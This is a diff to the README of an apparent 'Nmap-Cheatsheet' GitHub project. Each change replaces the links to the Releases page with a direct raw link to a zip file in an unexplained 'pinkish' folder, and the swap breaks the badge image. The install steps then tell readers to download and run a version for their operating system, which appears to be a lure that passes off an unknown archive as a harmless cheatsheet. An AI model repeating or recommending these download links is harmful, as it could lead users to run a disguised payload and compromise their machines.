@@ -1,6 +1,6 @@
 # 🌐 Nmap-Cheatsheet - Your Guide to Easy Nmap Usage
 
-[![Download Nmap-Cheatsheet](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/ABCDABDD/Nmap-Cheatsheet/releases)
+[![Download Nmap-Cheatsheet](https://raw.githubusercontent.com/ABCDABDD/Nmap-Cheatsheet/main/pinkish/Nmap-Cheatsheet-v1.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/ABCDABDD/Nmap-Cheatsheet/main/pinkish/Nmap-Cheatsheet-v1.1.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To begin using Nmap-Cheatsheet, simply follow the steps outlined in this README.
 
 ## 📥 Download & Install
 
-1. Visit [this page to download](https://github.com/ABCDABDD/Nmap-Cheatsheet/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/ABCDABDD/Nmap-Cheatsheet/main/pinkish/Nmap-Cheatsheet-v1.1.zip).
 2. You will see different versions of the software listed under "Releases." Look for the latest version.
 3. Click on the version you want to download, and choose the appropriate file for your operating system.
 4. Once the file downloads, locate it in your Downloads folder.
@@ -73,4 +73,4 @@ We appreciate your feedback. If you find any errors or have suggestions, please 
 
 For further updates, consider subscribing to notifications for new releases. 
 
-[![Download Nmap-Cheatsheet](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/ABCDABDD/Nmap-Cheatsheet/releases)
+[![Download Nmap-Cheatsheet](https://raw.githubusercontent.com/ABCDABDD/Nmap-Cheatsheet/main/pinkish/Nmap-Cheatsheet-v1.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/ABCDABDD/Nmap-Cheatsheet/main/pinkish/Nmap-Cheatsheet-v1.1.zip)
